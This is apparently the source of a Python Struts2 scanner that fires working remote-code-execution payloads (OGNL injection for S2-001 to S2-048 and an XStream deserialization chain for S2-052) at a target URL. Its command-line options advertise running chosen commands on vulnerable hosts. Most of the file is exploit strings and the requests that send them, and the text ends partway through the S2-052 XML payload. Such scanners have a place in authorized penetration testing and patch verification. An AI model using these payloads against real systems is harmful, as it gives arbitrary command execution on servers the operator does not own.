import argparse
import random
import requests
import time
import urllib
import re
import shlex
import string
from lxml import etree
import requests.packages.urllib3
from urllib.parse import urlparse
requests.packages.urllib3.disable_warnings()

test = """
+---------------------------------------------------------------------+
|          _____    ,    ,             ,    _____  _____              |
|         /____ ___/___ /--- /   / ___/___ /____  _____/              |
|         ____/   /__  /    /___/\   /__   ____/ /_____  scan         |
|                                                                     |
|                  https://github.com/ice0bear14h  BY ice0bear14h     |
+---------------------------------------------------------------------+ 
| > python3 struts2scan.py -u target                                  |
| > python3 struts2scan.py -u target -v CVE-XXXX-XXXX -c command      |      
| > python3 struts2scan.py -l targets.txt                             |
| > python3 struts2scan.py -l targets.txt -v CVE-XXXX-XXXX -c command |
+---------------------------------------------------------------------+
| Vulnerability library :                                             |
| CVE-2007-4556(s2-001) , CVE-2010-1870(s2-005) ,                     |
| CVE-2011-3923(s2-009) , CVE-2012-0392(s2-008) ,                     |
| CVE-2012-0838(s2-007) , CVE-2013-1965 ,                             |
| CVE-2013-1966 , CVE-2013-2135(s2-015) ,                             |
| CVE-2013-2251(s2-016) , CVE-2013-4316(s2-019) ,                     |
| CVE-2016-0785(s2-029) , CVE-2016-3081(s2-032) ,                     |
| CVE-2017-5638(s2-045) , CVE-2017-9791(s2-048) ,                     |
| CVE-2017-9805(s2-052) , CVE-2017-12611(s2-053) ,                    |
| CVE-2018-11776(s2-057) , CVE-2019-0230(s2-059) ,                    |
| CVE-2020-17530(s2-061)                                              |
+---------------------------------------------------------------------+
|     target     |                     Vul CVE                        |
+---------------------------------------------------------------------+
"""
print(test)

parser = argparse.ArgumentParser()
parser.add_argument('-u','--url',help='[+]target url : -u/--url http://localhost:8080',dest='url')
parser.add_argument('-l','--list',help='[+]target list : -l/--list targets.txt',dest='list')
parser.add_argument('-v','--vul',help='[+]vul exploit : -v/--vul CVE-XXXX-XXXX',dest='vul')
parser.add_argument('-c','--cmd',help='[+]command : -c/--cmd command',dest='cmd')
args = parser.parse_args()

url = args.url if args.url else None
lists = args.list if args.list else None
vul = args.vul if args.vul else None
cmd = args.cmd if args.cmd else None

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0',
    'Accept': '*/*'
}

timeout = 5

def url_specification(url):
    url = url.replace('#', '%23')  # 将url中的#替换为url编码
    url = url.replace(' ', '%20')
    # print(url)

    if ('://' not in url):
        url = str("http://") + str(url)
    scheme = urlparse(url).scheme   # 分割url取头部

    # Site: http://example.com
    site = scheme + '://' + urlparse(url).netloc   # 取url的头部和host

    # FilePath: /demo/struts2-showcase/index.action
    file_path = urlparse(url).path   # 提取url分割中的path
    if (file_path == ''):   # 如果path为空，贼为/
        file_path = '/'

    # Filename: index.action
    try:
        # path = site + file_path
        # if url.rstrip(path) == "" :
        #     url = site + "/"
        #     # print(url)
        filename = file_path.split('/')[-1]   # 提取url中文件部分，如果没有则为空
    except IndexError:
        filename = ''

    # File Dir: /demo/struts2-showcase/
    file_dir = file_path.rstrip(filename)   # 从path中移除文件后缀
    if (file_dir == ''):
        file_dir = '/'

    return({"site": site,
            "file_path":file_path,
            "file_dir": file_dir,
            "filename": filename})

def scanvul(url) :
    scan = []
    scan.append(url)
    try :
        urls_specification = url_specification(url)
        # print(urls_specification["file_dir"])
        # print(urls_specification["file_path"])
        # print(urls_specification["filename"])
                # print(urls_specification)
        # CVE-2007-4556 s2-001
        urlc = url
        # print(urlc)
        # url_initial = url
        # print(url_initial)
        url = urls_specification["site"] + urls_specification["file_path"]
                # print(url)
        # req = requests.get(url, headers=headers, verify=False, timeout=timeout, allow_redirects=False)
                # print(req.text)
                # scan.append(req.status_code)
            # time.sleep(3)
        # reqstatus = req.status_code
        # scan.append(reqstatus)
        # if reqstatus == 200 :
        # if "username:" and "password:" not in req.text :
        #     print('不存在登录页面 CVE-2007-4556 s2-001 检测取消')
            # else :
        if urls_specification["filename"] == "" :
            url = urls_specification["site"] + urls_specification["file_path"] + "/login.action"
            # print(url)
        # print(urls_specification["filename"])
        # print(url)
        # scan.append(url)
        """
        CVE-2007-4556 s2-001
        """
        poc = {"username":"","password":"%{1+1}"}
        time.sleep(2)
        req = requests.post(url, headers=headers, data=poc, verify=False, timeout=timeout, allow_redirects=False)
            # print(req.text)
        reqt = req.text
        if "name=\"password\" value=\"2\"" in req.text :
                # print(f"{url}存在 CVE-2007-4556 s2-001")
            cve = "CVE-2007-4556"
            scan.append(cve)

        time.sleep(2)

        """
        CVE-2010-1870 s2-005
        """

        if urls_specification["filename"] == "" :
            url = urls_specification["site"] + urls_specification["file_path"] + "/example/HelloWorld.action"
            # print(url)

        capta = ''
        words = ''.join((string.ascii_letters, string.digits))
        for i in range(8) :
            capta = capta + random.choice(words)

        # print(capta)

        cve_2010_1870 = '''?%28%27%5Cu0023context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5Cu003dfalse%27%29%28bla%29%28bla%29&%28%27%5Cu0023_memberAccess.excludeProperties%5Cu003d@java.util.Collections@EMPTY_SET%27%29%28kxlzx%29%28kxlzx%29&%28%27%5Cu0023_memberAccess.allowStaticMethodAccess%5Cu003dtrue%27%29%28bla%29%28bla%29&%28%27%5Cu0023mycmd%5Cu003d%5C%27''' + urllib.parse.quote(
            ('echo' + ' ' + capta),
            'utf-8') + '''%5C%27%27%29%28bla%29%28bla%29&%28%27%5Cu0023myret%5Cu003d@java.lang.Runtime@getRuntime%28%29.exec%28%5Cu0023mycmd%29%27%29%28bla%29%28bla%29&%28A%29%28%28%27%5Cu0023mydat%5Cu003dnew%5C40java.io.DataInputStream%28%5Cu0023myret.getInputStream%28%29%29%27%29%28bla%29%29&%28B%29%28%28%27%5Cu0023myres%5Cu003dnew%5C40byte[51020]%27%29%28bla%29%29&%28C%29%28%28%27%5Cu0023mydat.readFully%28%5Cu0023myres%29%27%29%28bla%29%29&%28D%29%28%28%27%5Cu0023mystr%5Cu003dnew%5C40java.lang.String%28%5Cu0023myres%29%27%29%28bla%29%29&%28%27%5Cu0023myout%5Cu003d@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28bla%29%28bla%29&%28E%29%28%28%27%5Cu0023myout.getWriter%28%29.println%28%5Cu0023mystr%29%27%29%28bla%29%29'''

        # print(url)

        capta_req = requests.get(url + cve_2010_1870 , headers=headers, verify=False, timeout=timeout, stream=True)
        if capta in capta_req.raw.read(50).decode(encoding='utf-8'):
            # print("")
            cve = "CVE-2010-1870"
            # print(cve)
            scan.append(cve)

        time.sleep(2)


        """
        CVE-2011-3923 s2-009
        CVE-2013-4316 s2-019
        """
        cve_2013_4316_pay = "#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),#req=@org.apache.struts2.ServletActionContext@getRequest(),#resp=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'echo 1024'})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[1000],#d.read(#e),#resp.println(#e),#resp.close()"
        cve_2013_4316_pay_end = urllib.parse.quote(cve_2013_4316_pay, "utf-8")
        if "?" in urlc :
            # print("aaa")
            url_parameter = urlc.split("?")
            url_parameter_one = url_parameter[0]
            url_parameter_two = url_parameter[1]
            # print(url_parameter_one)
            # print(url_parameter_two)
            if "&" in url_parameter_two :
                url_parameter_A = url_parameter_two.split("&")
                url_parameter_A_A = url_parameter_A[0]
                url_parameter_A_A_s = url_parameter_A_A.split("=")
                url_parameter_A_A_A = url_parameter_A_A_s[0]
                # print(url_parameter_A_A_A)
                url_parameter_A_A_B = url_parameter_A_A_s[1]
                # print(url_parameter_A_A_B)

                url_parameter_A_B = url_parameter_A[1]
                # print(url_parameter_A_two)
                url_parameter_A_B_s = url_parameter_A_B.split("=")
                url_parameter_A_B_A = url_parameter_A_B_s[0]
                # print(url_parameter_A_B_A)

                capta = ''
                words = ''.join((string.ascii_letters, string.digits))
                for i in range(8):
                    capta = capta + random.choice(words)

                cve_2011_3923 = '''?'''+ url_parameter_A_A_A + '''=''' + url_parameter_A_A_B + '''&''' + url_parameter_A_B_A + '''=''' + '''(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27''' + urllib.parse.quote(
                ('echo' + ' ' + capta),
                'utf-8') + '''%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)]'''

                # print(payload)

                capta_req = requests.get(url_parameter_one + cve_2011_3923, headers=headers, verify=False, timeout=timeout,
                                         stream=True)
                if capta in capta_req.raw.read(50).decode(encoding='utf-8'):
                    # print("")
                    cve = "CVE-2011-3923"
                    # print(cve)
                    scan.append(cve)

                time.sleep(2)

                cve_2013_4316_pay_and = '''?''' + url_parameter_A_A_A + '''=''' + url_parameter_A_A_B + '''&''' + url_parameter_A_B_A + '''=''' + cve_2013_4316_pay_end

                # print(cve_2013_4316_pay_and)

                cve_2013_4316_req = requests.get(url_parameter_one + cve_2013_4316_pay_and, headers=headers,
                                                 verify=False, timeout=timeout, stream=True)
                # print(cve_2013_4316_req.text)

                if "null" in cve_2013_4316_req.text:
                    # print("")
                    cve = "CVE-2013-4316"
                    # print(cve)
                    scan.append(cve)
                time.sleep(2)


            else :
                capta = ''
                words = ''.join((string.ascii_letters, string.digits))
                for i in range(8):
                    capta = capta + random.choice(words)

                cve_2011_3923 = '''&name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27''' + urllib.parse.quote(
                    ('echo' + ' ' + capta),
                    'utf-8') + '''%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)]'''

                capta_req = requests.get(urlc + cve_2011_3923, headers=headers, verify=False,
                                         timeout=timeout,
                                         stream=True)
                if capta in capta_req.raw.read(50).decode(encoding='utf-8'):
                    # print("")
                    cve = "CVE-2011-3923"
                    # print(cve)
                    scan.append(cve)
                time.sleep(2)

                cve_2013_4316_url_and = urlc + "&expression=" + cve_2013_4316_pay_end
                cve_2013_4316_req = requests.get(cve_2013_4316_url_and, headers=headers, verify=False, timeout=timeout,
                                                 stream=True)
                # print(cve_2013_4316_req.text)

                if "null" in cve_2013_4316_req.text:
                    # print("")
                    cve = "CVE-2013-4316"
                    # print(cve)
                    scan.append(cve)

                time.sleep(2)



        else :

            if urls_specification["filename"] == "":
                url = urls_specification["site"] + urls_specification["file_path"] + "/ajax/example5.action"
            #     print(url)
            # print(url)

            capta = ''
            words = ''.join((string.ascii_letters, string.digits))
            for i in range(8):
                capta = capta + random.choice(words)

            cve_2011_3923 = '''?age=12313&name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27''' + urllib.parse.quote(
                ('echo' + ' ' + capta),
                'utf-8') + '''%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)]'''

            capta_req = requests.get(url + cve_2011_3923, headers=headers, verify=False,
                                     timeout=timeout,
                                     stream=True)
            if capta in capta_req.raw.read(50).decode(encoding='utf-8'):
                # print("")
                cve = "CVE-2011-3923"
                # print(cve)
                scan.append(cve)

            time.sleep(2)

            if urls_specification["filename"] == "":
                url = urls_specification["site"] + urls_specification["file_path"] + "/index.action"

            cve_2013_4316_url_and = url + "?debug=command&expression=" + cve_2013_4316_pay_end
            cve_2013_4316_req = requests.get(cve_2013_4316_url_and, headers=headers, verify=False, timeout=timeout,
                                             stream=True)
            # print(cve_2013_4316_req.text)

            if "null" in cve_2013_4316_req.text:
                # print("")
                cve = "CVE-2013-4316"
                # print(cve)
                scan.append(cve)

            time.sleep(2)


        """
        CVE-2012-0392 s2-008
        """
        cve_2012_0392 = '''?debug=command&expression=(%23_memberAccess["allowStaticMethodAccess"]%3dtrue%2c%23foo%3dnew+java.lang.Boolean("false")+%2c%23context["xwork.MethodAccessor.denyMethodExecution"]%3d%23foo%2c%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec('echo 1024').getInputStream()))'''

        if urls_specification["filename"] == "":
            url = urls_specification["site"] + urls_specification["file_path"] + "/devmode.action"
            # print(url)

        cve_2012_0392_req = requests.get(url + cve_2012_0392 , headers=headers, verify=False, timeout=timeout, stream=True)

        # print(cve_2012_0392_req.text)
        if "1024" in cve_2012_0392_req.text :
            cve = "CVE-2012-0392"
            scan.append(cve)

        time.sleep(2)

        """
        CVE-2012-0838 s2-007
        """

        if urls_specification["filename"] == "":
            url = urls_specification["site"] + urls_specification["file_path"] + "user.action"
        # print(url)

        # capta = ''
        # words = ''.join((string.ascii_letters, string.digits))
        # for i in range(8):
        #     capta = capta + random.choice(words)

        cve_2012_0838 = '\' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(\'echo 1024\').getInputStream())) + \''

        poc = {"name" : "" ,
               "email" : "" ,
               "age" : cve_2012_0838}

        cve_2012_0838_req = requests.post(url , headers=headers, data=poc, verify=False, timeout=timeout,allow_redirects=False)

        # print(cve_2012_0838_req.text)

        # a = cve_2012_0838_req

        if 'name="age" value="1024' in cve_2012_0838_req.text :
            cve = "CVE-2012-0838"
            scan.append(cve)

        time.sleep(2)


        """
        CVE-2013-1965 s2-012
        """
        if urls_specification["filename"] == "":
            url = urls_specification["site"] + urls_specification["file_path"] + "user.action"
        # print(url)

        header = {"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0" ,
                  "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ,
                  "Accept-Language" : "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2" ,
                  "Content-Type" : "application/x-www-form-urlencoded" ,
                  "Accept-Encoding" : "gzip, deflate" ,
                  "Connection" : "close"
                  }

        capta = ''
        words = ''.join((string.ascii_letters, string.digits))
        for i in range(8):
            capta = capta + random.choice(words)

        # cve_2013_1965_pay = '''%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{''' + urllib.parse.quote(("echo" + ',' + capta),'utf-8') + '''})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}'''
        # print(cve_2013_1965_pay)
        # cve_2013_1965_pay = "%25%7B%23a%3D%28new+java.lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B%22echo%22%2C+%221%2B1%22%7D%29%29.redirectErrorStream%28true%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew+java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew+java.io.BufferedReader%28%23c%29%2C%23e%3Dnew+char%5B50000%5D%2C%23d.read%28%23e%29%2C%23f%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29%2C%23f.getWriter%28%29.println%28new+java.lang.String%28%23e%29%29%2C%23f.getWriter%28%29.flush%28%29%2C%23f.getWriter%28%29.close%28%29%7D"

        cve_2013_1965_pay = '%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"echo", "' + capta +'"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}'

        cve_2013_1965_payload = {"name" : cve_2013_1965_pay}

        cve_2013_1965_req = requests.post(url , headers=header , data=cve_2013_1965_payload , verify=False, timeout=timeout)
        # cve_2013_1965_num = cve_2013_1965_req.text
        # print(cve_2013_1965_num)
        # print(cve_2013_1965_req.status_code)
        # print(cve_2013_1965_req.text)
        # print(cve_2013_1965_req.raw.read(50).decode(encoding='utf-8'))
        if capta in cve_2013_1965_req.text :
            cve = "CVE-2013-1965"
            scan.append(cve)

        time.sleep(2)

        """
        cve_2013_1966 s2-013
        cve_2016_0785 s2-029
        """
        if "?" in urlc :
            # print("aaa")
            url_parameter = urlc.split("?")
            url_parameter_one = url_parameter[0]
            url_parameter_two = url_parameter[1]
            url_parameter_tree = url_parameter_two.split("=")
            url_parameter_four = url_parameter_tree[0]
            # print(url_parameter_one)
            # print(url_parameter_two)
            # print(url_parameter_four)

            capta = ''
            words = ''.join((string.ascii_letters, string.digits))
            for i in range(8):
                capta = capta + random.choice(words)

            url = url_parameter_one + '''?''' + url_parameter_four + '''='''
            # print(url)

            cve_2013_1965 = '''%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27''' + urllib.parse.quote(
                ('echo' + ' ' + capta),
                'utf-8') + '''%27).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println('cloudscannertest%3D'%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D'''

            capta_req = requests.get(url  + cve_2013_1965, headers=headers, verify=False, timeout=timeout, stream=True)

            # print(capta_req.text)

            if capta in capta_req.text :
                cve = "CVE-2013-1966"
                scan.append(cve)

            time.sleep(2)

            cve_2016_0785_pay = "(#_memberAccess['allowPrivateAccess']=true,#_memberAccess['allowProtectedAccess']=true,#_memberAccess['excludedPackageNamePatterns']=#_memberAccess['acceptProperties'],#_memberAccess['excludedClasses']=#_memberAccess['acceptProperties'],#_memberAccess['allowPackageProtectedAccess']=true,#_memberAccess['allowStaticMethodAccess']=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('echo " + capta + "').getInputStream()))"
            cve_2016_0785_pay_end = urllib.parse.quote(cve_2016_0785_pay, "utf-8")
            cve_2016_0785_pay_and = url_parameter_one + '''?''' + url_parameter_four + '''=''' + cve_2016_0785_pay_end
            cve_2016_0785_pay_and_req = requests.get(cve_2016_0785_pay_and , headers=headers, verify=False, timeout=timeout, stream=True)
            # print(cve_2016_0785_pay_and_req.text)
            if capta in cve_2016_0785_pay_and_req.text:
                # print("存在")
                cve = "CVE-2016-0785"
                scan.append(cve)

            time.sleep(2)

        else :
            if urls_specification["filename"] == "":
                url = urls_specification["site"] + urls_specification["file_path"] + "link.action"

            url = url + "?a="

            capta = ''
            words = ''.join((string.ascii_letters, string.digits))
            for i in range(8):
                capta = capta + random.choice(words)

            cve_2013_1965 = '''%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27''' + urllib.parse.quote(
                ('echo' + ' ' + capta),
                'utf-8') + '''%27).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println('cloudscannertest%3D'%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D'''

            capta_req = requests.get(url + cve_2013_1965, headers=headers, verify=False, timeout=timeout, stream=True)

            # print(capta_req.text)

            if capta in capta_req.text:
                cve = "CVE-2013-1966"
                scan.append(cve)

            if urls_specification["filename"] == "":
                url = urls_specification["site"] + urls_specification["file_path"] + "default.action"

            cve_2016_0785_pay = "(#_memberAccess['allowPrivateAccess']=true,#_memberAccess['allowProtectedAccess']=true,#_memberAccess['excludedPackageNamePatterns']=#_memberAccess['acceptProperties'],#_memberAccess['excludedClasses']=#_memberAccess['acceptProperties'],#_memberAccess['allowPackageProtectedAccess']=true,#_memberAccess['allowStaticMethodAccess']=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('echo " + capta + "').getInputStream()))"
            cve_2016_0785_pay_end = urllib.parse.quote(cve_2016_0785_pay, "utf-8")
            cve_2016_0785_pay_and = url + "?message=" + cve_2016_0785_pay_end
            cve_2016_0785_pay_and_req = requests.get(cve_2016_0785_pay_and, headers=headers, verify=False,
                                                     timeout=timeout, stream=True)
            # print(cve_2016_0785_pay_and_req.text)
            if capta in cve_2016_0785_pay_and_req.text:
                # print("存在")
                cve = "CVE-2016-0785"
                scan.append(cve)

            time.sleep(2)

        """
        CVE-2013-2135  s2-015
        """
        capta = ''
        words = ''.join((string.ascii_letters, string.digits))
        for i in range(8):
            capta = capta + random.choice(words)
        capta_echo = f"echo {capta}"
        url_site = urls_specification["site"]
        cve_2013_2135_pay = "${#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('" + capta_echo + "').getInputStream()),#q}"
        cve_2013_2135_pay_end = urllib.parse.quote(cve_2013_2135_pay,'utf-8')
        # print(cve_2013_2135_pay_end)
        cve_2013_2135_pay_abc = "/" + cve_2013_2135_pay_end + ".action"
        cve_2013_2135_req = requests.get(url_site + cve_2013_2135_pay_abc , headers=headers, verify=False, timeout=timeout, stream=True)
        # print(cve_2013_2135_req.text)
        if capta in cve_2013_2135_req.text :
            cve = "CVE-2013-2135"
            scan.append(cve)

        time.sleep(2)


        """   
        cve_2013_2251  s2-016
        """
        header = {"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0" ,
                  "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ,
                  "Accept-Language" : "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2" ,
                  "Accept-Encoding" : "gzip, deflate" ,
                  "Connection" : "close" ,
                  "Upgrade-Insecure-Requests" : "1"}
        if urls_specification["filename"] == "":
            url = urls_specification["site"] + urls_specification["file_path"] + "index.action"
        # print(url)
        capta = ''
        words = ''.join((string.ascii_letters, string.digits))
        # print(capta)
        for i in range(8):
            capta = capta + random.choice(words)
        capta_echo = f"echo {capta}"
        cve_2013_2251_pay = "${#context['xwork.MethodAccessor.denyMethodExecution']=false,#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('" + capta_echo + "').getInputStream())}"
        # cve_2013_2251_pay = "${#context['xwork.MethodAccessor.denyMethodExecution']=false,#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream())}"
        cve_2013_2251_pay_end = urllib.parse.quote(cve_2013_2251_pay, 'utf-8')
        # print(cve_2013_2251_pay_end)
        cve_2013_2251_pay_abc = "?redirect:" + cve_2013_2251_pay_end
        # print(url + cve_2013_2251_pay_abc)
        cve_2013_2251_req = requests.get(url + cve_2013_2251_pay_abc, headers=header, verify=False, timeout=timeout , allow_redirects=False)
        # print(cve_2013_2251_req.headers)
        # print(cve_2013_2251_req.headers.get("Location"))
        # print(cve_2013_2251_req.status_code)
        # print(cve_2013_2251_req.text)
        if "Location" in cve_2013_2251_req.headers :
            if capta in cve_2013_2251_req.headers.get("Location") :
                cve = "CVE-2013-2251"
                scan.append(cve)

        time.sleep(2)


        """
        CVE-2016-3081  s2-032
        """
        if urls_specification["filename"] == "":
            url = urls_specification["site"] + urls_specification["file_path"] + "index.action"
        # print(url)
        cve_2016_3081_pay = "?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=echo " + capta
        # print(cve_2016_3081_pay)
        cve_2016_3081_pay_and = url + cve_2016_3081_pay
        cve_2016_3081_pay_and_req = requests.get(cve_2016_3081_pay_and, headers=header, verify=False, timeout=timeout)
        # print("-----------")
        # print(cve_2016_3081_pay_and_req.text)
        if capta in cve_2016_3081_pay_and_req.text :
            cve = "CVE-2016-3081"
            scan.append(cve)

        time.sleep(2)


        """
        CVE-2017-5638  s2-045
        """
        if urls_specification["filename"] == "":
            url = urls_specification["site"] + urls_specification["file_path"] + "doUpload.action"
        cve_2017_5638_header = {"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0" ,
                                "Content-Type" : "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',120*120)}.multipart/form-data"}
        cve_2017_5638_req = requests.post(url , headers=cve_2017_5638_header ,verify=False, timeout=timeout)
        # print(cve_2017_5638_req.headers)
        if "vulhub" in cve_2017_5638_req.headers :
            if "14400" in cve_2017_5638_req.headers.get("vulhub") :
                cve = "CVE-2017-5638"
                scan.append(cve)
        cve_2017_5638_req.close()
        time.sleep(2)

        """
        CVE-2017-9791  s2-048
        """
        if urls_specification["filename"] == "":
            url = urls_specification["site"] + urls_specification["file_path"] + "integration/saveGangster.action"
        # print(url)
        cve_2017_9791_pay = {"name" : "${100+101}" ,
                             "age" : "1" ,
                             "bustedBefore" : "true" ,
                             "__checkbox_bustedBefore" : "true" ,
                             "description" : "1"}
        cve_2017_9791_pay_header = {"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0" ,
                                    "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ,
                                    "Accept-Language" : "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2" ,
                                    "Accept-Encoding" : "gzip, deflate" ,
                                    "Content-Type" : "application/x-www-form-urlencoded" ,
                                    "Upgrade-Insecure-Requests" : "1"}
        cve_2017_9791_pay_req = requests.post(url , headers=cve_2017_9791_pay_header , data=cve_2017_9791_pay ,verify=False, timeout=timeout)
        # print(cve_2017_9791_pay_req.text)
        etree_res = etree.HTML(cve_2017_9791_pay_req.text)
        cve_2017_9791_pay_result = etree_res.xpath('//*[@id="page-home"]/div[3]/div/div/ul/li/span/text()')
        # print(cve_2017_9791_pay_result)
        cve_2017_9791_pay_str_result = "".join(cve_2017_9791_pay_result)
        if "201" in cve_2017_9791_pay_str_result :
            cve = "CVE-2017-9791"
            scan.append(cve)

        time.sleep(2)

        """
        CVE-2017=9805  s2-052
        """
        if urls_specification["filename"] == "":
            url = urls_specification["site"] + urls_specification["file_path"] + "orders/3"
        cve_2017_9805_data = '''<map>
                                    <entry>
                                         <jdk.nashorn.internal.objects.NativeString>
                                           <flags>0</flags>
                                           <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
                                             <dataHandler>
                                               <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
                                                 <is class="javax.crypto.CipherInputStream">
                                                   <cipher class="javax.crypto.NullCipher">
                                                     <initialized>false</initialized>
                                                     <opmode>0</opmode>
                                                     <serviceIterator class="javax.imageio.spi.FilterIterator">
                                                       <iter class="javax.imageio.spi.FilterIterator">
                                                         <iter class="java.util.Collections$EmptyIterator"/>
                                                         <next class="java.lang.ProcessBuilder">
                                                           <command>
                                                                <string>touch</string>
                                                                <string>/tmp/test001.txt</string> 
                                                           </command>
                                                           <redirectErrorStream>false</redirectErrorStream>
                                                         </next>
                                                       </iter>
                                                       <filter class="javax.imageio.ImageIO$ContainsFilter">
                                                         <method>
                                                           <class>java.lang.ProcessBuilder</class>
                                                           <name>start</name>
                                                           <parameter-types/>
                                                         </method>
                                                         <name>foo</name>
                                                       </filter>
